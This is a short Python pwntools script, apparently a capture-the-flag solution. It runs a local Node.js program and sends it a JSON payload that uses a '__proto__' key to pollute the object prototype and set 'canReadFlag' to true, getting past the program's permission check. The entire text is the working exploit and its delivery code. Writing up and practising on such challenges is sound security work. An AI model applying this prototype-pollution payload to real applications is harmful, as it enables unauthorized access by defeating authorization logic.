from pwn import *

c = process('./main.mjs')

c.send(b'{"__proto__": {"canReadFlag": true}, "canQuack": false}\n')
print(c.recvall())
